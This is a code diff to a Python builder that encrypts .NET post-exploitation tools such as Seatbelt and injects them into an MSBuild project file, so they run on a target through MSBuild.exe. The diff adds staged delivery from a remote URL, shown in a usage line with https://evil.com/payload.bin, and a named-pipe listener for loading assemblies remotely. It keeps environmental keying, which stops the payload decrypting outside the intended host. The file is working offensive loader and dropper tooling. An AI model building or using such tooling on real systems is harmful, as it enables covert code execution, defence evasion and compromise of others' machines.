@@ -4,6 +4,7 @@ build_msbuild.py -- Encrypts a .NET assembly and injects into msbuild_payload.cs
 
 Usage:
   python build_msbuild.py <assembly_path> [options] [-- <assembly_args>...]
+  python build_msbuild.py --listener pipe=<name> [--key HEX --iv HEX]
 
   Everything after -- is passed as arguments to the loaded assembly's Main()
   or to the target method if --type/--method are specified.
@@ -11,10 +12,10 @@ Usage:
 Examples:
   python build_msbuild.py Seatbelt.exe -- -group=all
   python build_msbuild.py Seatbelt.exe -e xor -- -group=all
-  python build_msbuild.py Rubeus.exe -e aes -- kerberoast
-  python build_msbuild.py SharpHound.exe -o ready.csproj -- -c All
+  python build_msbuild.py Seatbelt.exe --staged https://evil.com/payload.bin -- -group=all
+  python build_msbuild.py Seatbelt.exe --keying hostname=WS01,domain=CORP -- -group=all
   python build_msbuild.py MyDll.dll --type Namespace.Class --method Run
-  python build_msbuild.py Seatbelt.exe --keying hostname=WORKSTATION01,domain=CORP -- -group=all
+  python build_msbuild.py --listener pipe=shrimploader
 """
 
 import argparse
@@ -120,11 +121,11 @@ def patch_template_for_xor(template: str) -> str:
 
     # Remove DeriveKey method
     derive_start = "    static byte[] DeriveKey(string saltB64, string keying)\n    {"
-    derive_end = "    }\n\n    static string ENCRYPTED_B64"
+    derive_end = "    }\n\n    static byte[] FetchPayload"
     if derive_start in template:
         idx_start = template.index(derive_start)
         idx_end = template.index(derive_end)
-        template = template[:idx_start] + "    static string ENCRYPTED_B64" + template[idx_end + len(derive_end):]
+        template = template[:idx_start] + "    static byte[] FetchPayload" + template[idx_end + len(derive_end):]
 
     # Simplify key resolution — remove keying branch, just use KEY_B64
     template = template.replace(
@@ -152,6 +153,71 @@ def patch_template_for_xor(template: str) -> str:
     return template
 
 
+def build_listener(args):
+    """Build a named pipe listener .csproj."""
+    spec = args.listener
+    if spec.startswith("pipe="):
+        pipe_name = spec[5:]
+    elif spec == "pipe":
+        pipe_name = "shrimploader"
+    else:
+        print(f"[-] Invalid listener spec: {spec}", file=sys.stderr)
+        print("    Use: --listener pipe=<name>", file=sys.stderr)
+        sys.exit(1)
+
+    script_dir = os.path.dirname(os.path.abspath(__file__))
+    template_path = args.template or os.path.join(script_dir, "msbuild_listener.csproj")
+    output_path = args.output or os.path.join(script_dir, "msbuild_ready.csproj")
+
+    if not os.path.exists(template_path):
+        print(f"[-] Listener template not found: {template_path}", file=sys.stderr)
+        sys.exit(1)
+
+    if args.key:
+        key = bytes.fromhex(args.key)
+        if len(key) != 32:
+            print(f"[-] AES-256 key must be 32 bytes (64 hex chars), got {len(key)}", file=sys.stderr)
+            sys.exit(1)
+    else:
+        key = os.urandom(32)
+
+    if args.iv:
+        iv = bytes.fromhex(args.iv)
+        if len(iv) != 16:
+            print(f"[-] AES IV must be 16 bytes (32 hex chars), got {len(iv)}", file=sys.stderr)
+            sys.exit(1)
+    else:
+        iv = os.urandom(16)
+
+    print(f"[*] Mode: Named pipe listener", file=sys.stderr)
+    print(f"[*] Pipe name: {pipe_name}", file=sys.stderr)
+    print(f"[*] AES key: {key.hex()}", file=sys.stderr)
+    print(f"[*] AES IV:  {iv.hex()}", file=sys.stderr)
+
+    with open(template_path, "r") as f:
+        template = f.read()
+
+    key_b64 = base64.b64encode(key).decode("ascii")
+    iv_b64 = base64.b64encode(iv).decode("ascii")
+
+    template = template.replace('"YOURPIPENAMEHERE"', f'"{pipe_name}"')
+    template = template.replace('"YOURKEYHERE"', f'"{key_b64}"')
+    template = template.replace('"YOURIVHERE"', f'"{iv_b64}"')
+
+    template = template.encode("ascii", errors="ignore").decode("ascii")
+    with open(output_path, "w", encoding="ascii") as f:
+        f.write(template)
+
+    size_kb = os.path.getsize(output_path) / 1024
+    print(f"[+] Listener: {output_path} ({size_kb:.0f} KB)", file=sys.stderr)
+    print(f"[*] On target:", file=sys.stderr)
+    print(f"    C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe"
+          f" {os.path.basename(output_path)}", file=sys.stderr)
+    print(f"[*] Send assemblies with:", file=sys.stderr)
+    print(f"    python pipe_client.py {pipe_name} Seatbelt.exe"
+          f" --key {key.hex()} --iv {iv.hex()} -- -group=all", file=sys.stderr)
+
+
 def main():
     argv = sys.argv[1:]
     assembly_args = []
@@ -163,7 +229,7 @@ def main():
     parser = argparse.ArgumentParser(
         description="Encrypt a .NET assembly and inject into msbuild_payload.csproj"
     )
-    parser.add_argument("assembly", help="Path to .NET assembly (.exe or .dll)")
+    parser.add_argument("assembly", nargs="?", help="Path to .NET assembly (.exe or .dll)")
     parser.add_argument(
         "-e", "--encryption", choices=["aes", "xor"], default="aes",
         help="Encryption method: aes (AES-256-CBC, default) or xor"
@@ -178,20 +244,38 @@ def main():
         "--keying",
         help="Environmental keying: derive AES key from target properties. "
              "Format: name=value,name=value. "
-             "Properties: hostname, domain, user, machineguid. "
-             "Example: --keying hostname=WS01,domain=CORP"
+             "Properties: hostname, domain, user, machineguid."
+    )
+    parser.add_argument(
+        "--staged",
+        help="Staged delivery: URL where encrypted payload will be hosted. "
+             "Generates a small dropper .csproj + payload .bin file."
+    )
+    parser.add_argument(
+        "--listener",
+        help="Build a named pipe listener instead of a one-shot loader. "
+             "Format: pipe=<name> (e.g. --listener pipe=shrimploader)"
     )
     parser.add_argument(
         "--type",
-        help="Fully qualified type name to invoke (e.g. Namespace.Class). Required for DLLs without an entry point."
+        help="Fully qualified type name to invoke (e.g. Namespace.Class)."
     )
     parser.add_argument(
         "--method",
-        help="Method name to invoke on --type (e.g. Execute). Required with --type."
+        help="Method name to invoke on --type (e.g. Execute)."
     )
     parser.add_argument("-o", "--output", help="Output file (default: msbuild_ready.csproj)")
-    parser.add_argument("--template", help="Template csproj (default: msbuild_payload.csproj)")
+    parser.add_argument("--template", help="Template csproj file to use")
     args = parser.parse_args(argv)
+
+    # Listener mode — separate flow
+    if args.listener:
+        build_listener(args)
+        return
+
+    # Standard mode — assembly is required
+    if not args.assembly:
+        parser.error("assembly is required (unless using --listener)")
 
     # Validate --type and --method are used together
     if (args.type is None) != (args.method is None):
@@ -204,6 +288,9 @@ def main():
         sys.exit(1)
     if args.keying and args.key:
         print("[-] --keying and --key are mutually exclusive.", file=sys.stderr)
+        sys.exit(1)
+    if args.staged and args.encryption == "xor":
+        print("[-] --staged requires AES encryption (cannot use with -e xor).", file=sys.stderr)
         sys.exit(1)
 
     script_dir = os.path.dirname(os.path.abspath(__file__))
@@ -244,6 +331,7 @@ def main():
 
         template = template.replace('"YOURPAYLOADHERE"', f'"{encrypted_b64}"')
         template = template.replace('"YOURKEYHERE"', f'"{key_b64}"')
+        template = template.replace('"YOURSTAGEDURL"', '""')
 
     elif args.keying:
         # AES with environmental keying
@@ -275,7 +363,18 @@ def main():
         salt_b64 = base64.b64encode(salt).decode("ascii")
         iv_b64 = base64.b64encode(iv).decode("ascii")
 
-        template = template.replace('"YOURPAYLOADHERE"', f'"{encrypted_b64}"')
+        if args.staged:
+            template = template.replace('"YOURPAYLOADHERE"', '""')
+            template = template.replace('"YOURSTAGEDURL"', f'"{args.staged}"')
+            payload_path = os.path.splitext(output_path)[0] + ".bin"
+            with open(payload_path, "wb") as f:
+                f.write(encrypted)
+            print(f"[*] Staged: payload written to {payload_path}", file=sys.stderr)
+            print(f"[*] Host at: {args.staged}", file=sys.stderr)
+        else:
+            template = template.replace('"YOURPAYLOADHERE"', f'"{encrypted_b64}"')
+            template = template.replace('"YOURSTAGEDURL"', '""')
+
         template = template.replace('"YOURKEYHERE"', '""')
         template = template.replace('"YOURIVHERE"', f'"{iv_b64}"')
         template = template.replace('"YOURKEYINGHERE"', f'"{keying_names}"')
@@ -315,7 +414,18 @@ def main():
         key_b64 = base64.b64encode(key).decode("ascii")
         iv_b64 = base64.b64encode(iv).decode("ascii")
 
-        template = template.replace('"YOURPAYLOADHERE"', f'"{encrypted_b64}"')
+        if args.staged:
+            template = template.replace('"YOURPAYLOADHERE"', '""')
+            template = template.replace('"YOURSTAGEDURL"', f'"{args.staged}"')
+            payload_path = os.path.splitext(output_path)[0] + ".bin"
+            with open(payload_path, "wb") as f:
+                f.write(encrypted)
+            print(f"[*] Staged: payload written to {payload_path}", file=sys.stderr)
+            print(f"[*] Host at: {args.staged}", file=sys.stderr)
+        else:
+            template = template.replace('"YOURPAYLOADHERE"', f'"{encrypted_b64}"')
+            template = template.replace('"YOURSTAGEDURL"', '""')
+
         template = template.replace('"YOURKEYHERE"', f'"{key_b64}"')
         template = template.replace('"YOURIVHERE"', f'"{iv_b64}"')
         template = template.replace('"YOURKEYINGHERE"', '""')
